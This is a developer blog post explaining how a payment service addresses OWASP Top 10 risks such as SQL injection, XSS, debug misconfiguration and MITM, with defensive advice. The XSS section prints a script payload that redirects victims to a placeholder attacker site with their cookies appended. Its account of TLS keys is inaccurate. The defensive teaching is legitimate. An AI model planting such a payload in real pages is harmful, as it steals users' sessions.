+++
date = 2019-08-23
linktitle = "How are we tackling OWASP 10 at noebs"
excerpt = "The Open Web Application Security Project, or OWASP, is an international non-profit organization dedicated to web application security. One of OWASP’s best-known project is the OWASP Top 10."

tags =  [
	"noebs",
	 "electronic-payment",
	 "owasp",
	 "security"
]
url = "/owasp"
+++

**OWASP** The Open Web Application Security Project is an international non-profit organization dedicated to web application security. They're best know by OWASP Top 10, a curated list of top 10 most critical security risks. This post will highlight some of the practices we are following at Solus while building our systems.

# SQL injection
This is one of the very common and the first item in OWASP Top 10. In it's simplest form, it is about sending a sql code through e.g., HTML Form input field. For this to work, the server must be *enabling* executing such an action. Let's take this simple example (using Python):

```python
form = request.form()
username = form["username"]   # there's an form field called username
sql.exec(username)    # This is a _sql injection_
```

It is almost always bad to execute raw sql queries. In fact, unless you DB is read-only, there's no need at ALL to allow raw sql queries execution.

The solution is: Don't allow raw sql execution.

# Broken Authentication

This can be broken into two categories:
- you're either building an insecure authentication system that exposes your users' data,
- or, your login system allows repeated logins attempts (brute-forcing)

We are using the industry standard practice here. We are using JWT for most of our authorization, while _planning_ to use session cookies for browser based ones. There are huge debates about JWT and session cookies, but it is all boils down to your whole system design. Sometimes, JWT fits to the whole system (if your target clients are Android/iOS), and sometimes session cookies are great, esp if you target clients are browser based.


For this, we have two solutions:
- We are using HSTS (HTTP Strict Transport Security).

> HSTS causes compliant browsers to strictly enforce web security practices. Specifically, it automatically turns all HTTP links into HTTPS links within an application, and it upgrades all SSL errors from warnings or bypassable errors into non-bypassable errors.

# XSS (Cross-site scription)

An attacker can send a malicious JS code (in the client code). It can be as bad as copying the user's cookies and gain control access to their session.

Suppose that you have an HTML form that allows your users to write some notes about their transactions, here is a sample code:

```html
<form>
<input type="text">
<label>Type your note here</label>
</form>
```

The user's form will be submitted __and__ rendered in a new page! Now this is very dangerous and it what leads to XSS security breaches. Let's see this in action. The next HTML page which will render the form result is like this:

```html
<!-- skipping through HTML head -->
<div>
<!-- form results go here -->
</div>

```

We expect our users to input stuff like time, text data BUT NOT JS CODE! What happens, if the users submitted `<script>alert("You have been spawned!")</script>`. This will launch a JS code from suspecious user's input. Now, this code can be even worse and accesses the user's cookies.

## How the attacker can log your cookies

It is quite simply actually. You can access your website cookie by accessing the cookie property of document class:
- use your browser inspector and go to console
- print document.cookie
and now you can access your cookies!

Now if the attacker wants to get that cookie, they will need to send it somewhere (most likey to a server/website they own)

- the attacker submits an unsafe js code that redirects the users to a new website (where they will log the cookie)
- now, the attacker does have access to your session and can do whatever they want while they are there (they can see your payment card info for instance, they can even submit a transaction assuming that your PIN is 0000 or your birthday)
The JS code to get your cookie is just this:

```javascript
<script>
document.location="http://mybadwebsite.com/?cookie_handler=" + document.cookie
</script>
```

__This can be even smarter by redirecting the user back to their original website!__

And now, when the user submits that un-sanitized inputs, it will:
- redirect them to a new website `http://mybadwebsite.com`
- it submits their cookie `document.cookie` to that website!

Here are a few steps you can follow to be safe against these types of attacks:
- Sanitize your users' inputs! In GO `template/html` library (the templating engine in GO, much like jinja2), it by default scapes HTML and JS tags
- If your website is something is form-like, there are a few things you can adopt:
	- let your users use markdown (it is safer)
	- you can specify some HTML elements as safe (e.g., <p>, <a>), and escape the rest. In this case, you will allow your users to have rich text experience

## The solution to all of the above issues is very simple: USE A FRAMEWORK!

The solution to all of the above issues is very simple, use a web framework! All of the modern web frameworks solves these rather naive secruity issues! I have worked with Python (Django and Flask and Starlette) and I've also worked with GO, all of them have built-in support for these common security issues! So, in practice, adapting *any* of modern web framework will save you from all of these issues, for free!

## Security Misconfigurations

I have seen this in the wild very recently in a payment system. We as developers love to have excessive stack trace and error reports while developing our services. Because there are so many errors we ought to face, it is very important that we get the whole stack trace so we get more insights into our error and fix it. However, that must stay in the development face ONLY! These stack traces (and perhaps other info) are very useful for attackers to gain access to your server.

Many of web frameworks (Django for instance) have DEBUG mode where instead of returing 500 INTERNAL SERVER ERROR, they also include the stack trace (when DEBUG=True) in Django `settings.py`. While this is very important while developing, it is very catastrophic in real life!

# Sensitive data exposure and MITM

We work in payment systems and it is very important to secure our user's data (their payment card info). These systems must adhere to even strictier rules than what OWASP offers as they have VERY sensitive data. PCI-DSS compliancy should be a #1 target for such systems and they shoud monitor and audit their systems and upgrade them regularly. _Security should be a profound part of their system design!_

> While getting EBS certificate is quite enough to have a secure system, we know that vendors often tend to modify their EBS-certified systems. This is a huge issue and it renders the whole EBS certification part useless.

## What we do in noebs to secure your data

- KISS (keeping it simple, stupid!). We are keeping it simple: we are only storing your PAN and expiration date, we don't store anything else!
- We had long discussions about storing PAN and expiration date, but we plan to change the way we store them VERY SOON!
- We have a Zero-log policy, so even if an attacker has breached our system, they will find no useful data!

## MITM Attacks

Man in the middle attacks are a very special and interesting class of attacks.

- You are using https for securing your system
- You have successfully solved CSRF, XSS and SQL Injections (hooray!)
- and now everything is fine, right?

As we know, TLS certificates are used to encrypt our request and make it secure. They are to be unbroken since the protocol is a public-private key exchange to decypher the http request. Meaning that, there's only one private key (in the server), and each client has their unique public key. So what could possibly go wrong?
Telecos (or MITM attackers) inject a tampered root CA in the host machine and replace their original one. When you send your "secure" request, it is being encrypted using the new root CA and sent to the server.
The attacker, having acquired your root CA, can then decypher your network traffic and have access to all of it.
